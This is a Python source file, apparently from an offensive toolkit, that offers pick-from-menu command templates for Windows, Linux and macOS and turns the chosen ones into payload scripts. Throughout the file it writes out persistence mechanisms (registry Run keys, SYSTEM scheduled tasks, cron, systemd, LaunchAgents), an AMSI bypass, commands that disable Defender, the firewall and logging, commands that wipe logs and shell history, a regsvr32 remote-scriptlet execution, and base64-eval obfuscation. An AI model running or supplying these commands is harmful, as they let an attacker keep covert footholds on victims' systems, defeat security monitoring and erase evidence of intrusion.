#!/usr/bin/env python3
"""
OS-Specific Command Executor for POLYGOTTEM
============================================
Provides cross-platform command execution support with OS-specific
command profiles and payload generation.

Features:
- Windows-specific commands
- Linux-specific commands
- macOS-specific commands
- Command templates
- Variable substitution
- Encoding/obfuscation
- Multi-stage commands

Author: SWORDIntel
Date: 2025-11-11
"""

import os
import sys
import platform
import base64
from typing import List, Dict, Any, Optional
from pathlib import Path

from tools.tui_helper import TUI, Colors


class CommandExecutor:
    """OS-specific command executor"""

    def __init__(self, tui: Optional[TUI] = None):
        """
        Initialize command executor

        Args:
            tui: TUI instance for output
        """
        self.tui = tui if tui else TUI()
        self.platform = platform.system().lower()

        # Command profiles
        self.profiles = self._initialize_profiles()

    def _initialize_profiles(self) -> Dict[str, Dict[str, Any]]:
        """Initialize OS-specific command profiles"""
        return {
            'windows': {
                'name': 'Windows Commands',
                'icon': '🪟',
                'categories': {
                    'persistence': self._windows_persistence_commands(),
                    'execution': self._windows_execution_commands(),
                    'evasion': self._windows_evasion_commands(),
                    'reconnaissance': self._windows_recon_commands(),
                    'custom': {}
                }
            },
            'linux': {
                'name': 'Linux Commands',
                'icon': '🐧',
                'categories': {
                    'persistence': self._linux_persistence_commands(),
                    'execution': self._linux_execution_commands(),
                    'evasion': self._linux_evasion_commands(),
                    'reconnaissance': self._linux_recon_commands(),
                    'custom': {}
                }
            },
            'darwin': {
                'name': 'macOS Commands',
                'icon': '🍎',
                'categories': {
                    'persistence': self._macos_persistence_commands(),
                    'execution': self._macos_execution_commands(),
                    'evasion': self._macos_evasion_commands(),
                    'reconnaissance': self._macos_recon_commands(),
                    'custom': {}
                }
            }
        }

    # ===== WINDOWS COMMANDS =====

    def _windows_persistence_commands(self) -> Dict[str, str]:
        """Windows persistence commands"""
        return {
            'registry_run': (
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                '/v "SystemUpdate" /t REG_SZ /d "{command}" /f'
            ),
            'startup_folder': (
                'copy "{executable}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
            ),
            'scheduled_task': (
                'schtasks /create /tn "SystemUpdate" /tr "{command}" '
                '/sc onlogon /ru "SYSTEM" /f'
            ),
            'wmi_persistence': (
                'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE '
                'Name="SystemMonitor", EventNameSpace="root\\cimv2", '
                'QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent '
                'WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
            ),
        }

    def _windows_execution_commands(self) -> Dict[str, str]:
        """Windows execution commands"""
        return {
            'cmd_exec': 'cmd /c {command}',
            'powershell_exec': 'powershell -ExecutionPolicy Bypass -Command "{command}"',
            'powershell_encoded': 'powershell -EncodedCommand {base64_command}',
            'wscript': 'wscript {script_file}',
            'cscript': 'cscript //nologo {script_file}',
            'mshta': 'mshta {hta_file}',
            'rundll32': 'rundll32.exe {dll_file},{function}',
            'regsvr32': 'regsvr32 /s /n /u /i:{url} scrobj.dll',
        }

    def _windows_evasion_commands(self) -> Dict[str, str]:
        """Windows evasion commands"""
        return {
            'amsi_bypass': (
                'powershell -Command "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\')'
                '.GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)"'
            ),
            'disable_defender': (
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ),
            'disable_firewall': 'netsh advfirewall set allprofiles state off',
            'clear_logs': (
                'powershell -Command "wevtutil cl System; wevtutil cl Security; wevtutil cl Application"'
            ),
        }

    def _windows_recon_commands(self) -> Dict[str, str]:
        """Windows reconnaissance commands"""
        return {
            'system_info': 'systeminfo',
            'user_info': 'whoami /all',
            'network_info': 'ipconfig /all && netstat -ano',
            'process_list': 'tasklist /v',
            'service_list': 'sc query',
            'av_check': (
                'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname'
            ),
        }

    # ===== LINUX COMMANDS =====

    def _linux_persistence_commands(self) -> Dict[str, str]:
        """Linux persistence commands"""
        return {
            'cron_job': 'echo "@reboot {command}" | crontab -',
            'systemd_service': (
                'cat > /etc/systemd/system/update.service << EOF\n'
                '[Unit]\nDescription=System Update\n\n'
                '[Service]\nExecStart={command}\n\n'
                '[Install]\nWantedBy=multi-user.target\nEOF\n'
                'systemctl enable update.service'
            ),
            'bashrc_persistence': 'echo "{command}" >> ~/.bashrc',
            'profile_persistence': 'echo "{command}" >> ~/.profile',
            'xdg_autostart': (
                'mkdir -p ~/.config/autostart && '
                'cat > ~/.config/autostart/update.desktop << EOF\n'
                '[Desktop Entry]\nType=Application\nName=Update\n'
                'Exec={command}\nEOF'
            ),
        }

    def _linux_execution_commands(self) -> Dict[str, str]:
        """Linux execution commands"""
        return {
            'bash_exec': 'bash -c "{command}"',
            'sh_exec': 'sh -c "{command}"',
            'python_exec': 'python3 -c "{command}"',
            'perl_exec': 'perl -e \'{command}\'',
            'at_exec': 'echo "{command}" | at now + 1 minute',
            'nohup_exec': 'nohup {command} &',
        }

    def _linux_evasion_commands(self) -> Dict[str, str]:
        """Linux evasion commands"""
        return {
            'clear_history': 'history -c && rm -f ~/.bash_history',
            'disable_logging': 'service rsyslog stop',
            'clear_logs': 'rm -f /var/log/*.log',
            'unset_history': 'unset HISTFILE',
        }

    def _linux_recon_commands(self) -> Dict[str, str]:
        """Linux reconnaissance commands"""
        return {
            'system_info': 'uname -a && cat /etc/*release',
            'user_info': 'whoami && id',
            'network_info': 'ifconfig -a && netstat -tulpn',
            'process_list': 'ps auxf',
            'service_list': 'systemctl list-units --type=service',
            'cron_check': 'crontab -l',
        }

    # ===== MACOS COMMANDS =====

    def _macos_persistence_commands(self) -> Dict[str, str]:
        """macOS persistence commands"""
        return {
            'launchagent': (
                'cat > ~/Library/LaunchAgents/com.update.plist << EOF\n'
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                '<plist version="1.0">\n<dict>\n'
                '<key>Label</key><string>com.update</string>\n'
                '<key>ProgramArguments</key>\n<array><string>{command}</string></array>\n'
                '<key>RunAtLoad</key><true/>\n'
                '</dict>\n</plist>\nEOF\n'
                'launchctl load ~/Library/LaunchAgents/com.update.plist'
            ),
            'cron_job': 'echo "@reboot {command}" | crontab -',
            'login_hook': 'sudo defaults write com.apple.loginwindow LoginHook {script_path}',
        }

    def _macos_execution_commands(self) -> Dict[str, str]:
        """macOS execution commands"""
        return {
            'bash_exec': 'bash -c "{command}"',
            'zsh_exec': 'zsh -c "{command}"',
            'python_exec': 'python3 -c "{command}"',
            'osascript': 'osascript -e \'{command}\'',
        }

    def _macos_evasion_commands(self) -> Dict[str, str]:
        """macOS evasion commands"""
        return {
            'clear_history': 'history -c && rm -f ~/.bash_history ~/.zsh_history',
            'disable_logging': 'sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.syslogd.plist',
            'clear_logs': 'sudo rm -rf /var/log/*.log',
        }

    def _macos_recon_commands(self) -> Dict[str, str]:
        """macOS reconnaissance commands"""
        return {
            'system_info': 'system_profiler SPSoftwareDataType SPHardwareDataType',
            'user_info': 'whoami && id',
            'network_info': 'ifconfig -a && netstat -an',
            'process_list': 'ps auxf',
        }

    # ===== COMMAND GENERATION =====

    def select_command_profile(self, target_platform: Optional[str] = None) -> Dict[str, Any]:
        """
        Interactively select command profile

        Args:
            target_platform: Target platform (None = current platform)

        Returns:
            Selected command profile
        """
        if target_platform is None:
            target_platform = self.platform

        self.tui.section("Command Profile Selection")
        self.tui.info(f"Current platform: {self.platform}")
        self.tui.info(f"Target platform: {target_platform}")
        print()

        # Build platform options
        from tools.interactive_menu import InteractiveMenu
        menu = InteractiveMenu(self.tui)

        platform_options = []
        for platform_key, profile in self.profiles.items():
            platform_options.append({
                'label': f"{profile['icon']} {profile['name']}",
                'description': f"Commands for {platform_key}",
                'value': platform_key,
                'selected': platform_key == target_platform
            })

        selected_idx = menu.single_select(
            "Select Target Platform",
            platform_options,
            default=0
        )

        if selected_idx is None:
            return None

        selected_platform = platform_options[selected_idx]['value']
        return self.profiles[selected_platform]

    def select_commands(self, profile: Dict[str, Any]) -> List[Dict[str, str]]:
        """
        Interactively select commands from profile

        Args:
            profile: Command profile

        Returns:
            List of selected commands with metadata
        """
        self.tui.section("Command Selection")

        from tools.interactive_menu import InteractiveMenu
        menu = InteractiveMenu(self.tui)

        # First select category
        category_options = []
        for cat_name, commands in profile['categories'].items():
            if commands:
                category_options.append({
                    'label': cat_name.capitalize(),
                    'description': f"{len(commands)} commands available",
                    'value': cat_name
                })

        cat_idx = menu.single_select(
            "Select Command Category",
            category_options
        )

        if cat_idx is None:
            return []

        category = category_options[cat_idx]['value']
        commands = profile['categories'][category]

        # Select specific commands
        command_options = []
        for cmd_name, cmd_template in commands.items():
            # Truncate long commands for display
            display_cmd = cmd_template[:60] + "..." if len(cmd_template) > 60 else cmd_template

            command_options.append({
                'label': cmd_name.replace('_', ' ').title(),
                'description': display_cmd,
                'value': {'name': cmd_name, 'template': cmd_template}
            })

        selected_indices = menu.multi_select(
            f"Select {category.capitalize()} Commands",
            command_options,
            min_selections=1
        )

        if not selected_indices:
            return []

        return [command_options[i]['value'] for i in selected_indices]

    def generate_command(self,
                        template: str,
                        variables: Dict[str, str],
                        encode: bool = False,
                        obfuscate: bool = False) -> str:
        """
        Generate command from template with variable substitution

        Args:
            template: Command template
            variables: Variables to substitute
            encode: Apply base64 encoding
            obfuscate: Apply obfuscation

        Returns:
            Generated command
        """
        # Substitute variables
        command = template.format(**variables)

        # Apply obfuscation
        if obfuscate:
            command = self._obfuscate_command(command)

        # Apply encoding
        if encode:
            command = self._encode_command(command)

        return command

    def _obfuscate_command(self, command: str) -> str:
        """Apply command obfuscation"""
        # Simple obfuscation - can be enhanced
        if 'powershell' in command.lower():
            # PowerShell obfuscation
            return self._obfuscate_powershell(command)
        elif 'bash' in command.lower() or 'sh' in command.lower():
            # Bash obfuscation
            return self._obfuscate_bash(command)
        else:
            return command

    def _obfuscate_powershell(self, command: str) -> str:
        """Obfuscate PowerShell command"""
        # Add random case variation
        import random
        obfuscated = ""
        for char in command:
            if char.isalpha() and random.random() > 0.5:
                obfuscated += char.upper() if char.islower() else char.lower()
            else:
                obfuscated += char
        return obfuscated

    def _obfuscate_bash(self, command: str) -> str:
        """Obfuscate Bash command"""
        # Use variable indirection
        return f'eval "$(echo {base64.b64encode(command.encode()).decode()} | base64 -d)"'

    def _encode_command(self, command: str) -> str:
        """Encode command (base64)"""
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        return encoded

    def prompt_command_variables(self, template: str) -> Dict[str, str]:
        """
        Prompt user for command variables

        Args:
            template: Command template

        Returns:
            Dict of variable values
        """
        # Extract variables from template
        import re
        variables = re.findall(r'\{(\w+)\}', template)

        if not variables:
            return {}

        self.tui.section("Command Variables")
        self.tui.info("Provide values for the following variables:")
        print()

        from tools.interactive_menu import InteractiveMenu
        menu = InteractiveMenu(self.tui)

        values = {}
        for var in variables:
            # Provide sensible defaults
            default = self._get_default_value(var)

            value = menu.prompt_input(
                f"{var.replace('_', ' ').title()}",
                default=default
            )

            values[var] = value

        return values

    def _get_default_value(self, var_name: str) -> str:
        """Get default value for variable"""
        defaults = {
            'command': 'calc.exe',
            'executable': 'payload.exe',
            'script_file': 'script.vbs',
            'url': 'http://example.com/payload',
            'dll_file': 'payload.dll',
            'function': 'DllMain',
            'hta_file': 'payload.hta',
        }

        return defaults.get(var_name, 'value')

    def generate_payload(self, commands: List[str], platform_key: str) -> bytes:
        """
        Generate payload from commands

        Args:
            commands: List of commands
            platform_key: Target platform

        Returns:
            Payload bytes
        """
        if platform_key == 'windows':
            return self._generate_windows_payload(commands)
        elif platform_key == 'linux':
            return self._generate_linux_payload(commands)
        elif platform_key == 'darwin':
            return self._generate_macos_payload(commands)
        else:
            return self._generate_generic_payload(commands)

    def _generate_windows_payload(self, commands: List[str]) -> bytes:
        """Generate Windows batch payload"""
        batch = "@echo off\n"
        batch += "REM Auto-generated payload\n\n"

        for i, cmd in enumerate(commands, 1):
            batch += f"REM Command {i}\n"
            batch += f"{cmd}\n\n"

        return batch.encode('utf-8')

    def _generate_linux_payload(self, commands: List[str]) -> bytes:
        """Generate Linux bash payload"""
        script = "#!/bin/bash\n"
        script += "# Auto-generated payload\n\n"

        for i, cmd in enumerate(commands, 1):
            script += f"# Command {i}\n"
            script += f"{cmd}\n\n"

        return script.encode('utf-8')

    def _generate_macos_payload(self, commands: List[str]) -> bytes:
        """Generate macOS zsh payload"""
        script = "#!/bin/zsh\n"
        script += "# Auto-generated payload\n\n"

        for i, cmd in enumerate(commands, 1):
            script += f"# Command {i}\n"
            script += f"{cmd}\n\n"

        return script.encode('utf-8')

    def _generate_generic_payload(self, commands: List[str]) -> bytes:
        """Generate generic payload"""
        payload = "# Auto-generated payload\n\n"

        for i, cmd in enumerate(commands, 1):
            payload += f"# Command {i}\n"
            payload += f"{cmd}\n\n"

        return payload.encode('utf-8')


if __name__ == '__main__':
    # Demo command executor
    tui = TUI()
    executor = CommandExecutor(tui)

    tui.banner("OS-Specific Command Executor", "Interactive Command Selection")

    # Select profile
    profile = executor.select_command_profile()
    if profile:
        tui.success(f"Selected: {profile['name']}")

        # Select commands
        commands = executor.select_commands(profile)
        if commands:
            tui.success(f"Selected {len(commands)} command(s):")
            for cmd in commands:
                tui.list_item(cmd['name'], level=1)
